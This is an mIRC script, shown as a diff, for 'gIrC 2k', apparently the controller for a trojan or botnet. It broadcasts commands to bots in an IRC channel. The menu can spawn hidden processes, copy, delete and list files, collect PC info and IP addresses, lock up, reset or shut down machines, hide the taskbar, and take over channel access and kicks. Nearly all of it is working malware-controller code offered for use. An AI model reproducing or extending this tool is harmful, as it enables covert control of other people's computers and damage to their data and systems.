@@ -1,0 +1,227 @@
+;_.-=^)> ºgIrC 2k v1.7º <(^=-._
+;By gAdAsT Enterprises
+;ºRazboiniKº-ºZhistokiYº
+;Addon For gIrC
+;04/01/00
+
+on 1:LOAD:{
+  set %beg 15,1***
+  set %gadast 15_-=^)> º14gAdAsT15º <(^=-_
+  set %girc.key $$?*="Enter The Key Of gIrC Bots?"
+}
+alias msgfuct {
+  set %i 0
+  set %icount 0
+  :start
+  inc %i
+  if ($snick(#,%i) != $null) {
+    if ($snick(#,%i) != $me) {
+      .timer 1 %i .msg $snick(#,%i) %tmpfuct
+      inc %icount
+    }
+    goto start
+    else { halt }
+  }
+  echo -a %beg %gadast 15Total 14Nicks 15Messaged14 %icount 15! | unset %i %icount %tmpfuct
+}
+alias msgnick {
+  if (%gircfile == $null) { echo -a %beg %gadast 15You 14Don't 15Have A 14Nick File 15! | halt }
+  else {
+    if ($exists(%gircfile) == $true) {
+      set %x 0
+      set %xcount 0 
+      set %xx 1
+      write -c tmp.txt -
+      :start
+      inc %x
+      if ($snick($chan,%x) != $null) {
+        if ($snick($chan,%x) != $me) {
+          :redo
+          set %tempnick $read %gircfile
+          set %tmp.c $read -w $+ $chr(42) $+ %tempnick $+ $chr(42) tmp.txt
+          if (%tempnick != %tmp.c) {
+            write tmp.txt %tempnick
+          }
+          if (%tempnick == %tmp.c) {
+            goto redo
+          }
+          if (%tempnick !ison $chan) {
+            .timer5 $+ %xx 1 %xx .msg $snick($chan,%x) nick %tempnick 
+            inc %xcount
+            inc %xx
+          }
+          if (%tempnick ison $chan) {
+            dec %x
+          }
+        }
+        goto start
+        else { halt }
+      }
+      echo -a %beg %gadast 15Total 14Nicks 15Messaged14 %xcount 15! | unset %x %xx %xcount %tempnick %rcrname %rcrlenght %tmp.c
+    }
+    else { echo -a %beg %gadast 15The Nick File °(14 $+ %gircfile $+ 15) Doesn't Exist ! | halt }
+  }
+}
+alias msgnickw {
+  if (%gircfile == $null) { echo -a %beg %gadast 15You 14Don't 15Have A 14Nick File 15! | halt }
+  else {
+    if ($exists(%gircfile) == $true) {
+      set %rcrname $$?="Which b0t?" | set %rcrlenght $len(%rcrname)
+      set %x 0
+      set %xcount 0 
+      set %xx 1
+      write -c tmp.txt -
+      :start
+      inc %x
+      if ($nick($chan,%x) != $null) {
+        if (($nick($chan,%x) != $me) && ($left($nick($chan,%x),%rcrlenght) == %rcrname)) {
+          :redo
+          set %tempnick $read %gircfile
+          set %tmp.c $read -w $+ $chr(42) $+ %tempnick $+ $chr(42) tmp.txt
+          if (%tempnick != %tmp.c) {
+            write tmp.txt %tempnick
+          }
+          if (%tempnick == %tmp.c) {
+            goto redo
+          }
+          if (%tempnick !ison $chan) {
+            .timer5 $+ %xx 1 %xx .msg $nick($chan,%x) nick %tempnick 
+            inc %xcount
+            inc %xx
+          }
+          if (%tempnick ison $chan) {
+            dec %x
+          }
+        }
+        goto start
+        else { halt }
+      }
+      echo -a %beg %gadast 15Total 14Nicks 15Messaged14 %xcount 15! | unset %x %xx %xcount %tempnick %rcrname %rcrlenght %tmp.c
+    }
+    else { echo -a %beg %gadast 15The Nick File °(14 $+ %gircfile $+ 15) Doesn't Exist ! | halt }
+  }
+}
+alias nickfile {
+  if (%gircfile != $null) {
+    if ($exists(%gircfile) == $true) { .run %gircfile | halt }
+    else { write -c %gircfile | .run %gircfile | halt }
+  }
+  else { set %gircfile $$?="Enter The Name Of The Nick File" | write -c %gircfile | .run %gircfile | halt }
+}
+
+menu nicklist,query {
+  ]*[-----------| &gIrC |-----------]*[
+  .gIrC Ctrl
+  ..Config
+  ...Nick?:set %tmpfuct !conf nick $$?="New Nick?" | .msgfuct
+  ...User?:set %tmpfuct !conf user $$?="New User?" | .msgfuct
+  ...Name?:set %tmpfuct !conf name $$?="New Name?" | .msgfuct
+  ...Pass?:set %tmpfuct !conf pass $$?="New Pass?" | .msgfuct
+  ...-
+  ...Main Chan?:set %tmpfuct !conf mchannel #$$?="Main Channel?" | .msgfuct
+  ...Key Main Chan?:set %tmpfuct !conf kmchannel $$?="Key For Main Channel?" | .msgfuct
+  ...-
+  ...Second Chan?:set %tmpfuct !conf schannel #$$?="Second Channel?" | .msgfuct
+  ...Key Second Chan?:set %tmpfuct !conf kschannel $$?="Key For Second Channel?" | .msgfuct
+  ...-
+  ...Third Chan?:set %tmpfuct !conf tchannel #$$?="Third Channel?" | .msgfuct
+  ...Key Third Chan?:set %tmpfuct !conf ktchannel $$?="Key For Third Channel?" | .msgfuct
+  ..-
+  ..Router
+  ...On:set %tmpfuct !router on | .msgfuct
+  ...Who?:set %tmpfuct !router $$?="Router To Nick?" | .msgfuct
+  ...-
+  ...Off:set %tmpfuct !router off | .msgfuct
+  ..-
+  ..TaskBar
+  ...Show:set %tmpfuct !taskbar show | .msgfuct
+  ...Hide:set %tmpfuct !taskbar hide | .msgfuct
+  ...-
+  ...Stat:set %tmpfuct !taskbar stat | .msgfuct
+  ..Cd
+  ...Open:set %tmpfuct !cd open | .msgfuct
+  ...-
+  ...Close:set %tmpfuct !cd close | .msgfuct
+  ..Monitor
+  ...On:set %tmpfuct !monitor on | .msgfuct
+  ...-
+  ...Off:set %tmpfuct !monitor off | .msgfuct
+  ..-
+  ..MsgBox?:set %tmpfuct !msgbox $$?="Which Message?" | .msgfuct
+  ..-
+  ..Copy?:set %tmpfuct !copy $$?="Source File? eg c:\Src.fle" $$?="Destination File? eg c:\Dst.fle" | .msgfuct
+  ..Delete?:set %tmpfuct !delete $$?="Delete File? eg c:\Dlt.fle" | .msgfuct
+  ..DirFile?:set %tmpfuct !dirfile $$?="Dir File? eg c:\*.txt" | .msgfuct
+  ..-
+  ..Spawn
+  ...Hide?:set %tmpfuct !spawn hide $$?="Start Hide Process? eg c:\windows\notepad.exe" | .msgfuct
+  ...-
+  ...Show?:set %tmpfuct !spawn show $$?="Start Visible Process? eg c:\windows\notepad.exe" | .msgfuct
+  ..-
+  ..PcInfo:set %tmpfuct !info | .msgfuct
+  ..Time:set %tmpfuct !time | .msgfuct
+  ..Ip:set %tmpfuct !reset | .msgfuct
+  ..-
+  ..LockUp:set %tmpfuct !lockup | .msgfuct
+  ..Reset:set %tmpfuct !reset | .msgfuct
+  ..ShutDown:set %tmpfuct !shutdown | .msgfuct
+  ..-
+  ..Help:set %tmpfuct !help | .msgfuct
+  .-
+  .IdentifY
+  ..Msg Key:if (%girc.key != $null) { set %tmpfuct %girc.key | .msgfuct }
+  ..-
+  ..Config Key:set %girc.key $$?*="Which Key?"
+  .-
+  .Fuction?:set %tmpfuct $$?="Which Fuction?" | .msgfuct
+  .MsgChan?:set %tmpfuct privmsg $chan : $+ $$?="Which Message?" | .msgfuct
+  .-
+  .Mode
+  ..Mode Me?:set %tmpfuct mode $chan $$?="Which Mode?" $me | .msgfuct
+  ..-
+  ..Mode Who?:set %tmpfuct mode $chan $$?="Which Mode?" $$?="Mode Who?" | .msgfuct
+  .Kick
+  ..gAdAsT?:set %tmpfuct kick $chan $$?="Who?" 15,1_-=^)>º14gAdAsT r00lz15º<(^=-_ | .msgfuct
+  ..Lamer?:set %tmpfuct kick $chan $$?="Who?" 14,1Lamer Go Sit In My Dicka! | .msgfuct
+  ..-
+  ..Kick Why?:set %tmpfuct kick $chan $$?="Who?" $$?="Why?" | .msgfuct
+  .-
+  .Prop
+  ..OwnerKey?:set %tmpfuct prop $chan ownerkey $$?="Which Owner?" | .msgfuct
+  ..HostKey?:set %tmpfuct prop $chan hostkey $$?="Which Host?" | .msgfuct
+  ..-
+  ..Topic?:set %tmpfuct topic $chan $$?="Which Topic?" | .msgfuct
+  ..-
+  ..Onjoin?:set %tmpfuct prop $chan onjoin $$?="Which OnJoin?" | .msgfuct
+  ..OnPart?:set %tmpfuct prop $chan onpart $$?="Which OnPart?" | .msgfuct
+  .Access
+  ..Add
+  ...Add Owner?:set %tmpfuct access $chan add owner $$?="Which Owner?" | .msgfuct
+  ...Add Host?:set %tmpfuct access $chan add host $$?="Which Host?" | .msgfuct
+  ...Add Voice?:set %tmpfuct access $chan add voice $$?="Which Voice?" | .msgfuct
+  ...Add Deny?:set %tmpfuct access $chan add deny $$?="Which Deny?" | .msgfuct
+  ..Clear
+  ...Clear Owner:set %tmpfuct access $chan clear owner | .msgfuct
+  ...Clear Host:set %tmpfuct access $chan clear host | .msgfuct
+  ...Clear Voice:set %tmpfuct access $chan clear voice | .msgfuct
+  ...Clear Deny:set %tmpfuct access $chan clear deny | .msgfuct
+  ...-
+  ...Clear Access:set %tmpfuct access $chan clear | .msgfuct
+  .-
+  .RanNick
+  ..RanNick:.msgnick
+  ..Which Bots?:.msgnickw
+  ..-
+  ..EditCreate:.nickfile
+  .-
+  .JoinPart
+  ..Which Join?:set %tmpfuct join #$$?="Which Chan To Join?" | .msgfuct
+  ..Which Part?:set %tmpfuct part #$$?="Which Chan To Part?" | .msgfuct
+  ..-
+  ..Part This:set %tmpfuct part $chan | .msgfuct
+  .Quit
+  ..gAdAsT:set %tmpfuct quit 15,1_-=^)>º14gAdAsT-r00lz15º<(^=-_ | .msgfuct
+  ..KilledSys:set %tmpfuct quit Killed By Sysop_ $+ $me | .msgfuct
+  ..-
+  ..Which Quit?:set %tmpfuct quit $$?="Which Quit?" | .msgfuct
+}
